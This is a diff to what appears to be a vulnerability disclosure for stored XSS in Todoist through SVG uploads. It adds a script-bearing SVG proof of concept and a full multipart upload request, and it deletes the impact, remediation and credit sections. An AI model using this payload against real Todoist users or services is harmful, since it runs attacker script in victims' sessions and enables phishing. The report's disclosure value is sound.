@@ -1,16 +1,50 @@
-Todoist Web version 8896— Stored XSS via SVG Upload
+Todoist App version 8896— Stored XSS via SVG Upload
 
-Class: Stored XSS (unsafe SVG rendering)
-Where: POST /api/v1/uploads → files.todoist.com → signed *.cloudfront.net
-Tested: 2025-09 (webapp ~8895–8896)
+**Class:** Stored XSS (unsafe SVG rendering)
+**Where:** POST /api/v1/uploads → files.todoist.com → signed *.cloudfront.net
+**Tested:** 2025-09 (webapp ~8895–8896)
 
 Summary
-
+```
 Uploaded SVG files are returned with Content-Type: image/svg+xml and inline disposition from a signed CloudFront URL. No sanitization or CSP sandbox is applied, so embedded JavaScript executes when a user opens the attachment from a Todoist task/comment.
-
+```
 ⸻
 
 1) Upload malicious SVG
+```
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script><![CDATA[
+    alert(prompt("sender_sefa_basnak"));
+  ]]></script>
+  <rect width="10" height="10" fill="red"/>
+</svg>
+```
+Request (snippet)
+```
+POST /api/v1/uploads HTTP/2
+Host: app.todoist.com
+Authorization: Bearer <REDACTED>
+Content-Type: multipart/form-data; boundary=...
+
+------WebKitFormBoundaryk3GBgFxgqQBDb1iT
+Content-Disposition: form-data; name="file_name"
+
+poc.svg
+------WebKitFormBoundaryk3GBgFxgqQBDb1iT
+Content-Disposition: form-data; name="file_size"
+
+179
+------WebKitFormBoundaryk3GBgFxgqQBDb1iT
+Content-Disposition: form-data; name="file_type"
+
+image/svg+xml
+------WebKitFormBoundaryk3GBgFxgqQBDb1iT
+Content-Disposition: form-data; name="project_id"
+
+6cxW6pGcpF7xGvFJ
+------WebKitFormBoundaryk3GBgFxgqQBDb1iT
+Content-Disposition: form-data; name="file"; filename="poc.svg"
+Content-Type: image/svg+xml
 
 <svg xmlns="http://www.w3.org/2000/svg">
   <script><![CDATA[
@@ -19,28 +53,9 @@ Uploaded SVG files are returned with Content-Type: image/svg+xml and inline disp
   <rect width="10" height="10" fill="red"/>
 </svg>
 
-Request (snippet)
 
-POST /api/v1/uploads HTTP/2
-Host: app.todoist.com
-Authorization: Bearer <REDACTED>
-Content-Type: multipart/form-data; boundary=...
-
---BOUNDARY
-Content-Disposition: form-data; name="file_name"
-
-poc.svg
---BOUNDARY
-Content-Disposition: form-data; name="file_type"
-
-image/svg+xml
---BOUNDARY
-Content-Disposition: form-data; name="file"; filename="poc.svg"
-Content-Type: image/svg+xml
-
-<svg>...</svg>
---BOUNDARY--
-
+------WebKitFormBoundaryk3GBgFxgqQBDb1iT--
+```
 UI evidence (upload)
 
 <img width="1676" height="1117" alt="poc-upload" src="https://github.com/user-attachments/assets/6aaab758-6ee5-4d08-9636-044cc58d3e01" />
@@ -81,18 +96,5 @@ https://d1ysz50cxb9zwl.cloudfront.net/.../file.svg?Expires=...&Signature=...&Key
 <img width="1013" height="1022" alt="poc-success" src="https://github.com/user-attachments/assets/e6c3b849-e140-4b90-a746-2d857f687fee" />
 
 ⸻
-
-Impact
-	•	Arbitrary JavaScript execution when viewing the attachment on the CDN origin.
-	•	Instant phishing/redirect via location=... in SVG.
-	•	Potential reverse-tabnabbing if links open without rel="noopener".
-
-Remediation
-	•	Serve SVGs as downloads: Content-Disposition: attachment.
-	•	Apply strict per-file CSP: Content-Security-Policy: sandbox; default-src 'none'; img-src data:.
-	•	Sanitize/strip <script>, event handlers, external refs—or rasterize SVG server-side.
-	•	Enforce rel="noopener noreferrer" on all external links.
-
-Credits
 
 Discovered by Sefa Basnak (@sefabasnak).
